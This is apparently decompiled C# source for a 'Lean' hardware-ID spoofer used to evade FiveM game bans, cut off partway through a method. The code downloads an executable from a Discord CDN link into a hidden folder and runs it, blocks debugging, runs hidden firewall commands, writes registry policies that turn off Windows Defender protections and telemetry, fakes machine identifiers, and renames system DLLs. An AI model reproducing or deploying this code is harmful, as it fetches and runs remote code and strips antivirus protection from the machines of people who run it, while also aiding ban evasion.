using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Lean.Addons;
using LeanSoftware.Properties;
using Microsoft.Win32;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace Lean.Forms
{
	public class Main : Form
	{
		private DiscordRpc.EventHandlers m_a;

		private DiscordRpc.RichPresence m_b;

		public static string folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		public static string specificFolder = Path.Combine(folder, "DigitalEntitlements");

		public static Random random = new Random();

		private string m_c = "XB0L9";

		private List<Process> m_d = new List<Process>();

		private IContainer m_e = null;

		private SiticoneDragControl m_f;

		private SiticoneControlBox m_g;

		private SiticoneControlBox m_h;

		private SiticoneTransition m_i;

		private Label m_j;

		private Label m_k;

		private SiticoneShadowForm m_l;

		private SiticoneLabel m_m;

		private SiticoneLabel m_n;

		private System.Windows.Forms.Timer m_o;

		private SiticoneLabel m_p;

		private BindingSource m_q;

		private Panel m_r;

		private PictureBox m_s;

		private SiticoneLabel m_t;

		private SiticoneShadowPanel m_u;

		private SiticoneLabel m_v;

		private PictureBox m_w;

		private Label m_x;

		private SiticoneLabel m_y;

		private SiticoneOSToggleSwith m_z;

		private SiticoneGradientButton m_aa;

		private SiticoneGradientButton m_ab;

		private SiticoneGradientButton m_ac;

		private SiticoneRoundedButton m_ad;

		private SiticoneRoundedButton m_ae;

		private SiticoneRoundedButton m_af;

		private SiticoneRoundedButton m_ag;

		private SiticoneRoundedButton m_ah;

		private SiticoneRoundedButton m_ai;

		private SiticoneRoundedButton m_aj;

		private SiticoneShadowPanel m_ak;

		private SiticoneLabel m_al;

		private PictureBox m_am;

		private Label m_an;

		private SiticoneRoundedButton m_ao;

		private SiticoneLabel m_ap;

		private SiticoneComboBox m_aq;

		private SiticoneShadowPanel m_ar;

		private SiticoneLabel m_as;

		private PictureBox m_at;

		private Label m_au;

		private Label m_av;

		private PageSetupDialog m_aw;

		private System.Windows.Forms.Timer m_ax;

		private Label m_ay;

		private SiticoneLabel m_az;

		private SiticoneShadowPanel m_ba;

		private SiticoneLabel m_bb;

		private PictureBox m_bc;

		private Label m_bd;

		private SiticoneRoundedButton m_be;

		private SiticoneRoundedButton m_bf;

		private SiticoneButton m_bg;

		private SiticoneRoundedButton m_bh;

		private SiticoneRoundedButton m_bi;

		private SiticoneRoundedButton m_bj;

		private SiticoneRoundedButton m_bk;

		private SiticoneLabel m_bl;

		private SiticoneTextBox m_bm;

		private SiticoneGradientButton m_bn;

		private SiticoneLabel m_bo;

		private SiticoneRoundedButton m_bp;

		private SiticoneRoundedButton m_bq;

		private SiticoneRoundedButton m_br;

		private SiticoneButton m_bs;

		private SiticoneLabel m_bt;

		private SiticoneLabel m_bu;

		private SiticoneLabel m_bv;

		private SiticoneLabel m_bw;

		private SiticoneTextBox m_bx;

		private System.Windows.Forms.Timer by;

		public Main()
		{
			System.Timers.Timer timer = new System.Timers.Timer(50.0);
			timer.AutoReset = true;
			timer.Elapsed += MyMethod;
			timer.Start();
			bx();
			this.m_u.BringToFront();
		}

		private void a(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		public static void MyMethod(object sender, ElapsedEventArgs e)
		{
			au();
		}

		public static void MyMethod2(object sender, ElapsedEventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("FiveM");
			if (processesByName.Length != 0)
			{
				Thread.Sleep(1000);
				Process process = new Process();
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.RedirectStandardInput = true;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.Verb = "runas";
				process.StartInfo.Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul";
				process.Start();
				Application.Exit();
			}
		}

		private void b(object sender, EventArgs e)
		{
			this.m_bw.Hide();
			this.m_bx.Hide();
			int num = 0;
			this.m_bu.Text = "Total Users: " + (num + 81);
			string text = "C:\\Program Files\\Saved\\imgsave.gif";
			if (File.Exists(text))
			{
				string text2 = "C:\\Program Files\\Saved\\" + "6426" + ".gif";
				File.Copy(text, text2);
				this.m_s.Image = new Bitmap(text2);
			}
			au();
			Process[] processesByName = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length == 0)
			{
				string path = "C:\\Program Files\\Win64";
				if (!Directory.Exists(path))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(path);
					directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
				}
				else
				{
					Directory.CreateDirectory("C:\\Program Files\\Win64");
					DirectoryInfo directoryInfo2 = Directory.CreateDirectory(path);
					directoryInfo2.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
				}
				this.m_bo.Show();
				this.m_bf.Hide();
				this.m_bq.Hide();
				this.m_br.Hide();
				this.m_be.Hide();
				this.m_bh.Hide();
				this.m_bi.Hide();
				this.m_bj.Hide();
					this.m_bo.Hide();
					this.m_bf.Show();
					this.m_be.Show();
					this.m_bq.Show();
					this.m_br.Show();
					this.m_bh.Show();
					this.m_bi.Show();
					this.m_bj.Show();
				this.m_u.BringToFront();
				this.m_n.Text = "";
				this.m_m.Text = "";
				this.m_p.Text = "Version: 3.0";
				Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				WebRequest webRequest = WebRequest.Create("https://pastebin.com/raw/GSXJSWtr");
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				streamReader.ReadToEnd();
				WebRequest webRequest2 = WebRequest.Create("https://pastebin.com/raw/P72g9Hxd");
				WebResponse response2 = webRequest2.GetResponse();
				Stream responseStream2 = response2.GetResponseStream();
				StreamReader streamReader2 = new StreamReader(responseStream2);
				streamReader2.ReadToEnd();
			}
			else
			{
				Hide();
				MessageBox.Show("Debug Attempt Detected", "Lean Protection", MessageBoxButtons.OK);
				Application.Exit();
			}
		}

		public DateTime UnixTimeToDateTime(long unixtime)
		{
			return new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
		}

		private void c(object sender, EventArgs e)
		{
		}

		private void d(object sender, EventArgs e)
		{
			DateTime now = DateTime.Now;
			this.m_ay.Text = $"{now.Day}/{now.Month}/{now.Year} {now.Hour}:{now.Minute}:{now.Second}";
		}

		private void e(object sender, EventArgs e)
		{
		}

		private void f(object sender, EventArgs e)
		{
		}

		private void g(object sender, EventArgs e)
		{
		}

		private void h(object sender, EventArgs e)
		{
		}

		private void i(object sender, EventArgs e)
		{
		}

		private void j(object sender, PaintEventArgs e)
		{
		}

		private void k(object sender, EventArgs e)
		{
		}

		private void l(object sender, EventArgs e)
		{
		}

		private void m(object sender, EventArgs e)
		{
			this.m_u.BringToFront();
		}

		private void n(object sender, EventArgs e)
		{
		}

		private void o(object sender, EventArgs e)
		{
		}

		private void p(object sender, EventArgs e)
		{
		}

		private void q(object sender, PaintEventArgs e)
		{
		}

		private void r(object sender, PaintEventArgs e)
		{
		}

		private void s(object sender, EventArgs e)
		{
		}

		private void t(object sender, PaintEventArgs e)
		{
		}

		private void u(object sender, EventArgs e)
		{
		}

		private void v(object sender, EventArgs e)
		{
		}

		private void w(object sender, EventArgs e)
		{
			string path = "C:\\Program Files\\Win64";
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			if (File.Exists("C:\\Program Files\\Win64\\cache.exe"))
			{
				Process.Start("C:\\Program Files\\Win64\\cache.exe");
				Thread.Sleep(1000);
				File.Delete("C:\\Program Files\\Win64\\cache.exe");
				return;
			}
			string address = "https://cdn.discordapp.com/attachments/953684464104513571/956446548160573450/cache.exe";
			string fileName = "C:\\Program Files\\Win64\\cache.exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(address, fileName);
			File.SetAttributes("C:\\Program Files\\Win64\\cache.exe", FileAttributes.Hidden);
			Thread.Sleep(1000);
			Process.Start("C:\\Program Files\\Win64\\cache.exe");
			Thread.Sleep(1000);
			File.Delete("C:\\Program Files\\Win64\\cache.exe");
		}

		private void x(object sender, EventArgs e)
		{
		}

		private void y(object sender, EventArgs e)
		{
			if (this.m_z.Checked)
			{
				this.m_a = default(DiscordRpc.EventHandlers);
				DiscordRpc.Discord_Initialize("959456405922926612", ref this.m_a, autoRegister: true, null);
				this.m_a = default(DiscordRpc.EventHandlers);
				DiscordRpc.Discord_Initialize("959456405922926612", ref this.m_a, autoRegister: true, null);
				this.m_b.state = "#1 Spoofer | discord.gg/unban";
				this.m_b.details = "Username: null";
				this.m_b.largeImageKey = "hugo";
				DiscordRpc.Discord_UpdatePresence(ref this.m_b);
			}
			else
			{
				DiscordRpc.Discord_Shutdown();
			}
		}

		private void z(object sender, EventArgs e)
		{
		}

		public static void Enable_LocalAreaConection(string adapterId, bool enable = true)
		{
			string text = "Ethernet";
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.Id == adapterId)
				{
					text = networkInterface.Name;
					break;
				}
			}
			string text2 = ((!enable) ? "disable" : "enable");
			ProcessStartInfo startInfo = new ProcessStartInfo("netsh", "interface set interface \"" + text + "\" " + text2);
			Process process = new Process();
			process.StartInfo = startInfo;
			process.Start();
			process.StartInfo.CreateNoWindow = true;
			process.WaitForExit();
		}

		public static string RandomMac()
		{
			string text = "ABCDEF0123456789";
			string text2 = "26AE";
			string text3 = "";
			Random random = new Random();
			text3 += text[random.Next(text.Length)];
			text3 += text2[random.Next(text2.Length)];
			for (int i = 0; i < 5; i++)
			{
				text3 += "-";
				text3 += text[random.Next(text.Length)];
				text3 += text[random.Next(text.Length)];
			}
			return text3;
		}

		private void aa(object sender, EventArgs e)
		{
			this.m_u.BringToFront();
		}

		public static string RandomString(int length)
		{
			return new string((from a in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
				select a[random.Next(a.Length)]).ToArray());
		}

		private void ab(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", writable: true).DeleteValue("Append Completion", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", writable: true).DeleteValue("AutoSuggest", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", writable: true).DeleteValue("EnableAutoTray", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", throwOnMissingSubKey: false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", throwOnMissingSubKey: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("AutoEndTasks", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("HungAppTimeout", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("WaitToKillAppTimeout", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true).DeleteValue("LowLevelHooksTimeout", throwOnMissingValue: false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoLowDiskSpaceChecks", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("LinkResolveIgnoreLinkInfo", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoResolveSearch", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoResolveTrack", throwOnMissingValue: false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true).DeleteValue("NoInternetOpenWith", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("GPU Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("Scheduling Category", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", writable: true).DeleteValue("SFIO Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("GPU Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("Priority", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("Scheduling Category", throwOnMissingValue: false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", writable: true).DeleteValue("SFIO Priority", throwOnMissingValue: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", 1);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", throwOnMissingSubKey: false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1", RegistryValueKind.DWord);
			try
			{
				if (this.m_aq.Text == "FiveM")
				{
					try
					{
						HWIDclick();
						string value = "15F24" + "-" + "F84E8" + "-" + "D3C91" + "-" + "2A49A";
						RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", writable: true);
						registryKey.SetValue("ProductID", value);
						registryKey.Close();
						InstallDate();
						Disk();
						HWIDclick();
						XBOXclick();
						PCclick();
						Diskclick();
						bi();
						SetMachineName("6DEFD6");
						if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
						{
							File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
							File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
						}
						if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
						{
							Directory.Delete("C:\\Program Files (x86)\\Blade Group");
							Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
						}
						d d = new d();
						d.b();
					}
					catch
					{
					}
					string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
					using (StreamWriter streamWriter = new StreamWriter(text))
					{
						streamWriter.WriteLine("echo off");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
